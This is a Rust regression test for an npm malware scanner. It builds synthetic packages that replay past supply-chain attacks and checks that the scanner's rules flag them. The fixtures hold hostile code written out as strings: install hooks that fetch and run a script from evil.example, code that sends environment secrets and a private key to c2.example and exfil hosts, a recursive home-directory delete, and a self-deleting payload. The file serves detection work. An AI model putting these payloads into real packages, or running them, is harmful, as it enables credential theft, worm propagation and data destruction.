//! Synthetic replicas of historical supply-chain incidents.
//!
//! Companion to `corpus_replay.rs`. That test wants the real
//! tarballs, but npm has unpublished most canonical malicious
//! versions, so this file ships tarballs hand-built to mimic the
//! *shape* of each incident — the same patterns the malware
//! actually used. Runs in CI on every push so refactors can't
//! silently regress detection of known attack families.
//!
//! Each test is named after the incident it replays.

use flate2::write::GzEncoder;
use flate2::Compression;
use monomi_core::{
    AnalysisCtx, ArtifactId, Corpus, Ecosystem, EcosystemId, HashAlgo, Integrity, Stage1Verdict,
    Tarball,
};
use monomi_npm::NpmEcosystem;
use monomi_rules::{default_ruleset, run};
use tar::{Builder, Header};

fn build_tgz(files: &[(&str, &[u8], u32)]) -> Vec<u8> {
    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    {
        let mut b = Builder::new(&mut gz);
        for (path, data, mode) in files {
            let mut h = Header::new_gnu();
            h.set_path(path).unwrap();
            h.set_size(data.len() as u64);
            h.set_mode(*mode);
            h.set_cksum();
            b.append(&h, *data).unwrap();
        }
        b.finish().unwrap();
    }
    gz.finish().unwrap()
}

fn fired(tar_bytes: Vec<u8>) -> Vec<String> {
    let tar = Tarball {
        source_url: None,
        bytes: tar_bytes,
    };
    let eco = NpmEcosystem::new();
    let manifest = eco.parse_manifest(&tar).unwrap();
    let lifecycle = eco.lifecycle_entrypoints(&tar, &manifest).unwrap();
    let entries = eco.walk(&tar).unwrap();
    let artifact = ArtifactId {
        ecosystem: EcosystemId::Npm,
        name: manifest.name.clone(),
        version: manifest.version.clone(),
        integrity: Integrity::from_bytes(HashAlgo::Sha512, &tar.bytes),
    };
    let corpus = Corpus::default();
    let ctx = AnalysisCtx {
        artifact: &artifact,
        manifest: &manifest,
        lifecycle: &lifecycle,
        entries: &entries,
        diff: None,
        registry: None,
        corpus: &corpus,
    };
    let s = run(&default_ruleset(), &ctx).stage1;
    // Note: we deliberately do NOT assert Verdict::Malicious here.
    // Some incident shapes only fire High+defer rules whose verdict
    // is Suspicious by design (waiting on Stage 2 to escalate); the
    // important property is that the rule *fired*, not that Stage 1
    // alone decided to block. Tests assert on rule IDs instead.
    assert_ne!(
        s.verdict,
        Stage1Verdict::Clean,
        "expected non-clean verdict, got Clean; findings: {:?}",
        s.findings
    );
    s.findings.into_iter().map(|f| f.rule_id).collect()
}

fn assert_any(ids: &[String], wanted: &[&str]) {
    assert!(
        wanted.iter().any(|w| ids.iter().any(|id| id == w)),
        "expected at least one of {wanted:?}, got {ids:?}"
    );
}

/// **event-stream / flatmap-stream (2018).** Payload only activates
/// when `require.main.filename` matches `copay-dash`, then evals a
/// large base64 blob.
#[test]
fn shape_event_stream_2018() {
    let pkg = r#"{ "name": "flatmap-stream-shape", "version": "0.1.1" }"#;
    let blob = "A".repeat(2048);
    let src = format!(
        r#"
        var main = require.main.filename;
        if (main.indexOf("copay-dash") !== -1) {{
            var p = "{blob}";
            eval(Buffer.from(p, 'base64').toString());
        }}
        "#
    );
    let ids = fired(build_tgz(&[
        ("package/package.json", pkg.as_bytes(), 0o644),
        ("package/index.js", src.as_bytes(), 0o644),
    ]));
    assert_any(&ids, &["NPM005", "NPM037"]);
}

/// **ua-parser-js / coa / rc (2021).** preinstall fetches a binary
/// over HTTP and chmod-execs it.
#[test]
fn shape_ua_parser_js_2021() {
    let pkg = r#"{
        "name": "ua-parser-js-shape",
        "version": "0.7.29",
        "scripts": {
            "preinstall": "curl -sSL http://evil.example/x.sh -o /tmp/x && chmod +x /tmp/x && /tmp/x"
        }
    }"#;
    let ids = fired(build_tgz(&[(
        "package/package.json",
        pkg.as_bytes(),
        0o644,
    )]));
    // Any of: dangerous lifecycle, shell pipe, chmod-exec.
    assert_any(&ids, &["NPM003", "NPM019", "NPM036"]);
}

/// **node-ipc / peacenotwar (2022).** Geolocation-gated destructive
/// overwrite walking `os.homedir()`.
#[test]
fn shape_node_ipc_2022() {
    let pkg = r#"{ "name": "node-ipc-shape", "version": "10.1.1" }"#;
    let src = r#"
        var os = require('os'), fs = require('fs');
        var ip = require('dns').lookup;
        ip('api.ipify.org', function(err, addr) {
            if (addr && addr.startsWith('5.')) {
                fs.rmSync(os.homedir(), { recursive: true, force: true });
            }
        });
    "#;
    let ids = fired(build_tgz(&[
        ("package/package.json", pkg.as_bytes(), 0o644),
        ("package/dao.js", src.as_bytes(), 0o644),
    ]));
    assert_any(&ids, &["NPM039"]);
}

/// **Shai-Hulud worm (2024).** postinstall reads env-token in bulk
/// and shells out to `npm publish` to propagate to the maintainer's
/// other packages.
#[test]
fn shape_shai_hulud_2024() {
    let pkg = r#"{
        "name": "worm-shape",
        "version": "1.0.1",
        "scripts": {
            "postinstall": "node -e \"const e=process.env;require('https').request({host:'c2.example',path:'/'+JSON.stringify(e)}).end();require('child_process').execSync('npm publish')\""
        }
    }"#;
    let ids = fired(build_tgz(&[(
        "package/package.json",
        pkg.as_bytes(),
        0o644,
    )]));
    // NPM034 (registry-write in lifecycle) is decisive; NPM041
    // (bulk env + sink) and NPM011 (env-token in lifecycle) are
    // strong corroborators.
    assert_any(&ids, &["NPM034"]);
    assert_any(&ids, &["NPM041", "NPM011"]);
}

/// **@solana/web3.js (Dec 2024).** Hardcoded cryptocurrency
/// private-key / mnemonic literal shipped into a previously-clean
/// utility package.
#[test]
fn shape_solana_web3js_2024() {
    let pkg = r#"{ "name": "wallet-shape", "version": "1.95.6" }"#;
    let src = r#"
        const PRIVATE_KEY = "0x4c0883a69102937d6231471b5dbb6204fe5129617082792ae468d01a3f362318";
        function exfil() {
            fetch('https://drain.example', { method: 'POST', body: PRIVATE_KEY });
        }
    "#;
    let ids = fired(build_tgz(&[
        ("package/package.json", pkg.as_bytes(), 0o644),
        ("package/util.js", src.as_bytes(), 0o644),
    ]));
    assert_any(&ids, &["NPM033"]);
}

/// **Anti-forensic self-cleanup variant.** Payload runs, then
/// unlinks `__filename` so responders can't find what executed.
#[test]
fn shape_anti_forensic_self_delete() {
    let pkg = r#"{ "name": "ghost-shape", "version": "0.0.1" }"#;
    let src = r#"
        fetch('https://exfil.example', { method: 'POST', body: process.env.AWS_SECRET_ACCESS_KEY });
        require('fs').unlinkSync(__filename);
    "#;
    let ids = fired(build_tgz(&[
        ("package/package.json", pkg.as_bytes(), 0o644),
        ("package/index.js", src.as_bytes(), 0o644),
    ]));
    assert_any(&ids, &["NPM018"]);
    assert_any(&ids, &["NPM011"]);
}
